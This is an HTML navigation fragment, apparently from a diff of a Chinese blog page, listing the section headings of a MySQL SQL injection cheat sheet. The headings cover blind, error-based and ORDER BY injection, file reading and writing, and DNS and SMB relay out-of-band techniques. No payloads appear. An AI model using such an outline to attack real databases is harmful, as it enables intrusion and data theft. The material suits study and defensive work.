class="nav-link" href="#SMB-Relay-注入攻击"><span class="nav-number">8.4.</span> <span class="nav-text">SMB Relay 注入攻击</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#测试注入"><span class="nav-number">1.</span> <span class="nav-text">测试注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#注释符"><span class="nav-number">2.</span> <span class="nav-text">注释符</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#表和字段"><span class="nav-number">3.</span> <span class="nav-text">表和字段</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#确定字段数"><span class="nav-number">3.1.</span> <span class="nav-text">确定字段数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ORDER-BY"><span class="nav-number">3.1.1.</span> <span class="nav-text">ORDER BY</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SELECT-…-INTO"><span class="nav-number">3.1.2.</span> <span class="nav-text">SELECT … INTO</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#判断已知表名的字段数"><span class="nav-number">3.1.3.</span> <span class="nav-text">判断已知表名的字段数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查表名"><span class="nav-number">3.2.</span> <span class="nav-text">查表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查列名"><span class="nav-number">3.3.</span> <span class="nav-text">查列名</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#版本-amp-主机名-amp-用户-amp-库名"><span class="nav-number">4.</span> <span class="nav-text">版本&主机名&用户&库名</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#基于布尔注入"><span class="nav-number">5.</span> <span class="nav-text">基于布尔注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#基于时间的盲注"><span class="nav-number">6.</span> <span class="nav-text">基于时间的盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#条件语句-amp-时间函数"><span class="nav-number">6.1.</span> <span class="nav-text">条件语句&时间函数</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MySql报错注入"><span class="nav-number">7.</span> <span class="nav-text">MySql报错注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Order-by-注入"><span class="nav-number">8.</span> <span class="nav-text">Order by 注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#字符串连接"><span class="nav-number">9.</span> <span class="nav-text">字符串连接</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#常用函数"><span class="nav-number">10.</span> <span class="nav-text">常用函数</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GROUP-CONCAT"><span class="nav-number">10.1.</span> <span class="nav-text">GROUP_CONCAT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#COUNT"><span class="nav-number">10.2.</span> <span class="nav-text">COUNT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LIMIT"><span class="nav-number">10.3.</span> <span class="nav-text">LIMIT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#floor"><span class="nav-number">10.4.</span> <span class="nav-text">floor</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RAND"><span class="nav-number">10.5.</span> <span class="nav-text">RAND</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#不常用函数绕过滤"><span class="nav-number">11.</span> <span class="nav-text">不常用函数绕过滤</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件操作"><span class="nav-number">12.</span> <span class="nav-text">文件操作</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#文件操作权限"><span class="nav-number">12.1.</span> <span class="nav-text">文件操作权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#读文件"><span class="nav-number">12.2.</span> <span class="nav-text">读文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#写文件"><span class="nav-number">12.3.</span> <span class="nav-text">写文件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#带外通道"><span class="nav-number">13.</span> <span class="nav-text">带外通道</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是带外通道注入？"><span class="nav-number">13.1.</span> <span class="nav-text">什么是带外通道注入？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#条件限制"><span class="nav-number">13.2.</span> <span class="nav-text">条件限制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS注入"><span class="nav-number">13.3.</span> <span class="nav-text">DNS注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SMB-Relay-注入攻击"><span class="nav-number">13.4.</span> <span class="nav-text">SMB Relay 注入攻击</span></a></li></ol></li></ol></div>
             
 
           </div>
